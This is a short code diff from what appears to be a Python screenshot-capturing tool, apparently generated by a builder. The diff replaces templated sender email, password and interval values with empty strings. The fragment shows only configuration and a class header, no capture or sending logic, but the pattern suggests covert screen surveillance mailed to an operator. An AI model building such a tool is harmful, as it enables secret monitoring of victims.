@@ -10,10 +10,10 @@ import threading
 from multiprocessing import Process
 import imghdr
 
-Sender_Email = '''+f'"{email1}"'+f'''
+Sender_Email = ""
 Reciever_Email = Sender_Email
-Password = '''+f'"{password}"'+f'''
-interval = '''+str(interval)+f'''
+Password = ""
+interval = ""
 
 class Screenshots:
     def __init__(self, email, password, interval):
